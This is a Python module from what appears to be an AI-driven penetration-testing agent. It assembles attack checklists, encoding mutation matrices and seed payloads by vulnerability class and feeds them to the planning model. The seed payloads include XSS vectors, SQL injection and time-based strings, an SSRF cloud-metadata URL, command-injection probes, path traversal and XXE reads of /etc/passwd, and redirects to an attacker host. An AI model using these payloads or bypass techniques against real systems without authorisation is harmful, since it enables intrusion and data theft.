"""
core/payload_pack.py

Deterministic, LLM-free payload-pack retrieval (2026-11-25 4-repo harvest,
asset 8 -- re-implemented from pentest-agents' mcp-writeup-server
`WriteupSearchEngine.search_payloads()`, github.com/H-mmer/pentest-agents;
that repo ships no LICENSE file anywhere in its tree, so this is a
from-scratch re-authoring of the underlying IDEA against our own vuln-class
vocabulary, not a port of its source or its payloads.md content -- see
work.md's 2026-11-25 harvest entry for the full rationale).

WHAT WAS PORTED vs. NOT
  Ported (re-authored): the vuln-type alias normalization, and the idea of a
  per-class "exhaustive attack checklist" + "mutation matrix" (encoding/
  transport/context families to combine with any payload) -- this is the
  genuinely reusable methodology, independent of any specific payload string.

  NOT ported: the source's 2746-line rules/payloads.md payload corpus itself,
  and its relevance-SCORING/section-extraction machinery (parsing an h2-
  sectioned markdown file, scoring sections by keyword hits, pulling
  backtick/code-fence lines out of the top 3). That corpus is a large curated
  aggregation whose provenance we can't verify line-by-line, and copying it
  wholesale from a no-LICENSE repo is exactly what the harvest task's "re-
  implement in our style, don't copy-paste unless LICENSE clearly allows" rule
  exists to prevent. The handful of SEED_PAYLOADS below are generic,
  textbook-common probes (a reflected-XSS marker, a SQL error-oracle
  character, an SSRF metadata-IP, ...) with no specific source to attribute --
  the same genre of example already used in core/tools/http_probe.py's own
  differential battery.

LANDING SPOT: core/ai_planner.py::_retrieve_technique_knowledge() calls
build_payload_pack() for the current candidate_classes (the same "suspected:"
vuln-class set that already feeds the RAG/YAML technique-advisor query) and
appends the result to the technique-knowledge block shown to the model --
this is advisory prompt text, same posture as campaign_judgment.py: it never
creates a Finding and never changes _confirmation_strength()'s proven/lead
boundary, it just gives the model (and, downstream, a self_script probe it
authors) a denser checklist to work from for the vuln class it already
suspects.
"""

from typing import Dict, List

# Re-authored alias table -- canonical classes match this codebase's existing
# vuln_class vocabulary (see agents/base_agent.py, core/campaign_judgment.py).
_ALIASES: Dict[str, str] = {
    "cross site scripting": "xss", "cross-site scripting": "xss",
    "stored xss": "xss", "reflected xss": "xss", "dom xss": "xss", "blind xss": "xss",
    "sql injection": "sqli", "sql-injection": "sqli",
    "nosql injection": "nosql",
    "server-side request forgery": "ssrf", "server side request forgery": "ssrf",
    "remote code execution": "rce", "command injection": "rce",
    "auth bypass": "auth", "authentication bypass": "auth",
    "authorization": "idor", "broken access control": "idor", "insecure direct object reference": "idor",
    "template injection": "ssti", "server-side template injection": "ssti",
    "path traversal": "lfi", "local file inclusion": "lfi",
    "xml external entity": "xxe",
    "open redirect": "redirect", "open-redirect": "redirect",
}


def normalize_vuln_class(label: str) -> str:
    """Collapse a free-text or hyphenated vuln-type label to this codebase's
    canonical short form (e.g. 'Cross Site Scripting' -> 'xss')."""
    lowered = (label or "").strip().lower()
    return _ALIASES.get(lowered, lowered)


# Re-authored combo checklists (not copied from any source's exact wording).
_BASE_CHECKLIST: List[str] = [
    "confirm the sink actually fires with a benign baseline probe before trying anything exotic",
    "replay across every sibling endpoint under the same route, not just the one first tried",
    "replay as every available role (unauthenticated, low-privilege, high-privilege)",
    "swap HTTP method where the endpoint accepts more than one verb",
]

_PER_CLASS_CHECKLIST: Dict[str, List[str]] = {
    "xss": [
        "trace source -> sink in the JS bundle before injecting blind",
        "for a stored sink: plant once, then check every OTHER viewer/export/notification path that renders it",
        "check whether a CSP is actually enforced, or just present with a bypassable policy",
    ],
    "sqli": [
        "try all three oracles: error-based, boolean-blind, and time-based -- not just whichever fires first",
        "check for second-order injection: a value stored now, triggered later via a report/export/admin view",
    ],
    "ssrf": [
        "try the IP-bypass ladder: decimal, octal, IPv6-mapped, DNS rebinding -- not just the literal address",
        "if internal reach is confirmed, try each major cloud metadata endpoint (AWS/GCP/Azure), not just one",
    ],
    "idor": [
        "swap method (GET -> PUT/PATCH/DELETE) on a confirmed object-reference bug, not just the one verb tried",
        "check tenant-switch headers/cookies (X-Org, Account-ID) for the same cross-tenant pattern",
    ],
    "ssti": [
        "start with a non-destructive primitive probe before anything that looks like a sandbox-escape payload",
        "if a blocklist is suspected, map which attribute names it actually blocks before trying to obfuscate",
    ],
    "rce": [
        "check deserialization sinks (pickle/YAML-load/unserialize) before assuming template injection is the path",
        "if command injection is confirmed, check IFS/newline-based filter bypasses before giving up on a blocked char",
    ],
    "oauth": [
        "test the redirect_uri allowlist for subdomain/path/fragment confusion, not just an exact-match bypass",
        "check state + PKCE validation are both actually enforced, not just present in the flow",
    ],
    "graphql": [
        "check introspection on every endpoint variant (batched, persisted-query), not just the obvious one",
        "probe query depth / alias flooding as a DoS-adjacent signal, and node()-style IDs for IDOR",
    ],
}


def build_attack_checklist(vuln_class: str) -> List[str]:
    canonical = normalize_vuln_class(vuln_class)
    return list(_BASE_CHECKLIST) + list(_PER_CLASS_CHECKLIST.get(canonical, []))


# Re-authored mutation matrix: encoding/transport/context families to combine
# with ANY payload, plus a few per-class families.
_BASE_MUTATIONS: Dict[str, List[str]] = {
    "encoding": ["raw", "url", "double-url", "unicode-escape", "html-entity", "mixed-case"],
    "transport": ["query", "body-form", "body-json", "header", "cookie"],
    "context": ["html-attr", "js-string", "url-param", "svg"],
}
_PER_CLASS_MUTATIONS: Dict[str, Dict[str, List[str]]] = {
    "ssrf": {"routing": ["ipv6-mapped", "decimal-ip", "octal-ip", "dns-rebind"]},
    "sqli": {"syntax": ["boolean", "time", "union", "stacked"]},
    "idor": {"identifier": ["numeric", "uuid", "base64", "jwt-sub"]},
    "ssti": {"object-type": ["function", "class", "namespace"]},
}


def build_mutation_matrix(vuln_class: str) -> Dict[str, List[str]]:
    canonical = normalize_vuln_class(vuln_class)
    matrix = {k: list(v) for k, v in _BASE_MUTATIONS.items()}
    matrix.update(_PER_CLASS_MUTATIONS.get(canonical, {}))
    return matrix


# A handful of generic, textbook-common seed probes per class -- not sourced
# from payloads.md, the same genre of example already used elsewhere in this
# codebase (core/tools/http_probe.py's own error/boolean/reflection oracles).
SEED_PAYLOADS: Dict[str, List[str]] = {
    "xss": ["\"><svg onload=alert(1)>", "<img src=x onerror=alert(1)>"],
    "sqli": ["'", "' OR '1'='1", "' AND SLEEP(5)-- -"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://[::ffff:127.0.0.1]/"],
    "idor": ["<increment/decrement the numeric id>", "<swap to another user's UUID>"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}"],
    "rce": ["; id", "| id", "`id`"],
    "redirect": ["//attacker.example/", "https://attacker.example/"],
    "lfi": ["../../../../etc/passwd", "....//....//etc/passwd"],
    "xxe": ["<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]>"],
}


def build_payload_pack(vuln_class: str, max_chars: int = 900) -> str:
    """
    Return a compact, deterministic payload-pack block for `vuln_class`:
    an attack checklist, a mutation matrix, and a few seed payloads to
    permute through it. Returns "" for an empty/unrecognized input with
    nothing to offer -- never raises.
    """
    if not vuln_class or not vuln_class.strip():
        return ""
    canonical = normalize_vuln_class(vuln_class)
    checklist = build_attack_checklist(vuln_class)
    mutations = build_mutation_matrix(vuln_class)
    seeds = SEED_PAYLOADS.get(canonical, [])

    lines: List[str] = [f"Payload pack ({canonical}):"]
    lines.append("  Attack checklist: " + "; ".join(checklist[:5]))
    mutation_bits = [f"{family}={'/'.join(variants[:4])}" for family, variants in mutations.items()]
    lines.append("  Mutation matrix: " + ", ".join(mutation_bits))
    if seeds:
        lines.append("  Seed payloads: " + ", ".join(seeds[:5]))

    block = "\n".join(lines)
    if len(block) > max_chars:
        block = block[: max_chars - 3].rstrip() + "..."
    return block
